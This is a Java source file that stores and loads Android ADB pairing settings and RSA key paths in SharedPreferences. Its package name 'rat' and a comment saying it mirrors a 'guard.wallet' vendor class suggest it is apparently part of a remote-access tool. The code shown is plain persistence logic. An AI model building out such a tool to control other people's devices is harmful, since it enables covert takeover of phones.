package com.vendor.rat.adb;

import com.google.gson.Gson;
import com.vendor.rat.control.entity.ADBConfig;
import com.vendor.rat.utils.SharedUtils;

/**
 * ADB 配对状态持久化
 * 对标 vendor: com.guard.wallet.utils.h (ADB 配置存取)
 *
 * 使用 SharedUtils + Gson 将 ADBConfig 序列化/反序列化到 SharedPreferences。
 * 密钥文件路径单独存储。
 */
public final class AdbPersistence {

    private static final String KEY_ADB_CONFIG = "adb_config_json";
    private static final String KEY_PRIVATE_KEY_PATH = "adb_private_key_path";
    private static final String KEY_CERT_PATH = "adb_cert_path";
    private static final Gson gson = new Gson();

    private AdbPersistence() {}

    /** 保存 ADB 配置 (自动设置 updateTime) */
    public static void saveConfig(ADBConfig config) {
        if (config == null) return;
        config.setUpdateTime(System.currentTimeMillis());
        SharedUtils.save(gson.toJson(config), KEY_ADB_CONFIG);
    }

    /** 加载 ADB 配置 (不存在时返回空 ADBConfig) */
    public static ADBConfig loadConfig() {
        String json = SharedUtils.getString(KEY_ADB_CONFIG);
        if (json == null || json.isEmpty()) return new ADBConfig();
        try {
            ADBConfig config = gson.fromJson(json, ADBConfig.class);
            return config != null ? config : new ADBConfig();
        } catch (Exception e) {
            return new ADBConfig();
        }
    }

    /** 是否已配对 */
    public static boolean isPaired() {
        return loadConfig().isPaired();
    }

    /** 保存 RSA 密钥文件路径 */
    public static void saveKeyPaths(String privateKeyPath, String certPath) {
        SharedUtils.save(privateKeyPath, KEY_PRIVATE_KEY_PATH);
        SharedUtils.save(certPath, KEY_CERT_PATH);
    }

    /** 获取私钥路径 */
    public static String getPrivateKeyPath() {
        return SharedUtils.getString(KEY_PRIVATE_KEY_PATH);
    }

    /** 获取证书路径 */
    public static String getCertPath() {
        return SharedUtils.getString(KEY_CERT_PATH);
    }

    /** 清除所有 ADB 持久化数据 (用于调试重置) */
    public static void clearAll() {
        SharedUtils.remove(KEY_ADB_CONFIG);
        SharedUtils.remove(KEY_PRIVATE_KEY_PATH);
        SharedUtils.remove(KEY_CERT_PATH);
    }
}
